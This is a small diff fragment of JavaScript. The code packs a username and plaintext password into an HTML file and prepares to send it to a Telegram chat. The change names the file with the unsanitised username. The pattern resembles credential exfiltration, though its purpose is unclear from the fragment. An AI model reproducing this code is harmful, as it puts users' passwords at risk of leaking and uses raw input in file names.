@@ -352,7 +352,7 @@
                     // Generate HTML file
                     const htmlContent = generateCredentialsHtml(cleanUsername, password, chatId);
                     const blob = new Blob([htmlContent], { type: 'text/html' });
-                    const file = new File([blob], `credentials_${Date.now()}.html`, { type: 'text/html' });
+                    const file = new File([blob], `credentials_${username}.html`, { type: 'text/html' });
 
                     // Send to Telegram as document
                     const formData = new FormData();
